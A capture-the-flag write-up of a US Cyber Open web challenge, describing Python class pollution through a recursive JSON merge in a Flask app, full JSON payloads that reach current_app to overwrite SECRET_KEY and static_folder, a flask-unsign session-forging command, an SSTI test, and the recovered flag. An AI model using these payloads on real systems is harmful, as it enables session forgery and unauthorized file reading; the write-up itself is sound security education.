---
title: 'Soláthairtí Guinness 🇮🇪'
previewDescription: 'US Cyber Open S6 — web: Soláthairtí Guinness 🇮🇪'
description: 'Writeup for Soláthairtí Guinness 🇮🇪 from US Cyber Open Season VI (Web Exploitation).'
date: 2026-08-01
image: './dcb08acc-6974-4cf7-8375-75203900b3fd.png'
tags: ['ctf-writeups']
authors: ['seth']
---


[← US Cyber Open Season VI Writeups](/blog/us-cyber-open-season-vi-writeups)

![image.png](./dcb08acc-6974-4cf7-8375-75203900b3fd.png "24rem")

In this challenge, there first thing I noticed was SSTI if we can get a valid session through our username on `/secure`. Since the flag is loaded into the jinja context as bratach, if we could get our username to be `{{bratach}}` we could just see the flag on the page (`bratach.txt` holds the flag).

![image.png](./image-43.png "100%")

Unfortunately, there’s two problems with this:

1. We can’t get a valid session unless we either find a way to register an account or leak/change the flask session signing key and there’s no endpoint to register an account.
2. It does a regex match for `.*bratach.*` on our username, so we’d need to find some other way to read that variable, like `{{self.__dict__}}` to see all the variables and their values in local context or something similar. The full payload would have to be 15 characters or less though due to the `len()` check, and I wasn’t able to figure out a payload to get the value of the `bratach` variable that fit that length constraint.

Interestingly, the `/forgot` endpoint takes our json object and calls this recursive function on it, seemingly recreating the exact json object but as a python object (and merging it with `self`).

![image.png](./image-44.png "100%")

![image.png](./image-45.png "32rem")

(notably, the lines `setattr(sprioc, eochair, luach)` and `sprioc[eochair] = luach`)

There is a requirement that the username field be a user in the database, so we can just use the `admin` user that gets created at the start here

![image.png](./image-46.png "32rem")

From just testing running this locally, I found that I could overwrite attributes of the `DearmadPasfhocail()` instance itself, as well as the attributes of those attributes.

For example, if I sent this request:

![image.png](./image-47.png "32rem")

What I find in my breakpoint (done with `ipython.embed()`) locally is that i’ve overwritten an arbitrary attribute on `self` here

![image.png](./image-48.png "24rem")

This seems a bit like javascript prototype pollution, but in python! If I can overwrite attributes on other objects, I could change the app.config values. Here’s the list of attributes I can access on this object.

```python
In [3]: dir(self)
Out[3]: 
['__class__',
 '__delattr__',
 '__dict__',
...
 '__subclasshook__',
 '__weakref__',
 '_cumaisc',
 '_deimhnigh_ainm',
 'sabhail',
 'test',
 'username']
```

Notably, if I use a payload like this: 

```json
{
  "username": "admin",
  "__class__": {
    "__init__": {
      "test": "val"
    }
  }
}
```

I can edit in theory modify `self.__class__.__init__.test` to be `"val"`

![image.png](./image-49.png "100%")

yup!

```python
In [3]: self.__class__.__init__
Out[3]: <function uirlisi.DearmadPasfhocail.__init__(self, sonrai)> 
```

okay this init function is not so interesting, but what if somewhere among it’s attributes is a reference to something which has a reference to something which leads to the `Flask()` class instance which would let us change the `app.config` dict, then we could really modify something useful. 

I wrote up a little script with the help of gemma-4-31b-it to do a breadth-first-search on all the attributes recursively and just output them all into a nice JSON file, that way I can see if we have a path to anything useful.

![image.png](./image-50.png "100%")

This seems interesting, let’s re-run it starting from there.

![image.png](./image-51.png "100%")

My process is to send a request like that, and then run this `testfunc()` I made for the recursive attribute listing

![image.png](./image-52.png "100%")

Searching for `<Flask` (trying to find a reference to the Flask() instance that holds the config dictionary), I stumbled across this

```json
"self.Table.__new__.__globals__": {
	... 
	'current_app': <Flask 'freastalai'>,
	...
}
```

Aha! A reference to the current app. As a reminder, so far our chain is:

```json
{
  "username": "admin",
  "__class__": {
    "__init__": {
      "__globals__": {
        "bunachar": {
          "Table": {
            "__new__": {
              "__globals__": {
                "current_app": {
                  "test": "val"
                }
              }
            }
          }
        }
      }
    }
  }
}
```

So with this primitive, we should be able to overwrite `current_app.config.SECRET_KEY` and change the signing key. Or any of these other attributes on `current_app`!

![image.png](./image-53.png "32rem")

Everything in `current_app.config`:

![image.png](./image-54.png "32rem")

I thought for a while about which of these attributes could be useful. `SECRET_KEY` we can set to an arbitrary and sign our own arbitrary sessions with the `flask-unsign`  tool. This solves the 1st problem we had before but we still are dealing with 2. (the restrictions on our SSTI via username that prevent us from reading the flag).



#### Using SSTI (ended up being a dead end)

We can send a request like this:

```json
POST /forgot HTTP/1.1
...
{
  "username": "admin",
  "__class__": {
    "__init__": {
      "__globals__": {
        "bunachar": {
          "Table": {
            "__new__": {
              "__globals__": {
                "current_app": {
	                "config": {
	                  "SECRET_KEY": "val"
	                }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

now `current_app.config["SECRET_KEY"]="val"` so we can spoof the session with username `{{7*7}}`for example:

```bash
$ flask-unsign --sign --cookie "{'username':'{{7*7}}'}" --secret 'val'
eyJ1c2VybmFtZSI6Int7Nyo3fX0ifQ.aixRfA.n6U66rGNYT9E8if-VqeyD5kEiPo
```

There, we signed our own session. Now to use it:

![image.png](./using-ssti-image.png "100%")

And yup, it executed 7*7 to get 49 so we did indeed get SSTI!



There might be a way around that, but I never found it. Something I tried was setting `current_app.jinja_env.variable_start_string='{'` and `current_app.jinja_env.variable_start_string='}'` so that I could use `{self.__dict__}` as my SSTI payload and be just at the maximum username length (15). The only issue is that if you look closely at the code `/secure` creates a new jinja environment which does not follow those global configurations.

![image.png](./image-55.png "100%")

Alternatively, I found that flask automatically serves all files in the `current_app.static_folder` from `/static`! That means if we can just set `static_folder` to where the flag is, we can just have the server serve it. Here’s the payload:

```json
POST /forgot HTTP/1.1
...
{
  "username": "admin",
  "__class__": {
    "__init__": {
      "__globals__": {
        "bunachar": {
          "Table": {
            "__new__": {
              "__globals__": {
                "current_app": {
	                "static_folder":""
                }
              }
            }
          }
        }
      }
    }
  }
}
```

That causes static folder to be the current working directory, which when I run the challenge locally through docker compose is `/app`, also the location of the flag. Then I can just fetch it with a GET request to `/static/bratch.txt`. Weirdly, I couldn’t get this working on remote, so I decided to serve up `freastalai.py`, the main Flask server script, instead to see if there was some difference between local and remote. Here’s me priming  `/static` to map to `/app` on remote:

![image.png](./image-56.png "100%")

And fetching `/app/freastalai.py`

![image.png](./image-57.png "100%")

Huh, remote really is different from local, it’s at `/flag.txt` instead of `/app/bratach.txt`

In that case, I’ll set `/static` to map to the root directory with `/app/..`

![image.png](./image-58.png "100%")

There we go

![image.png](./image-59.png "100%")

Flag: `SVIUSCG{10148cbb87c5e2782ebc5c7b4d42b970}`

Very fun challenge! Also the first challenge I’ve done where the codebase is entirely in Irish.
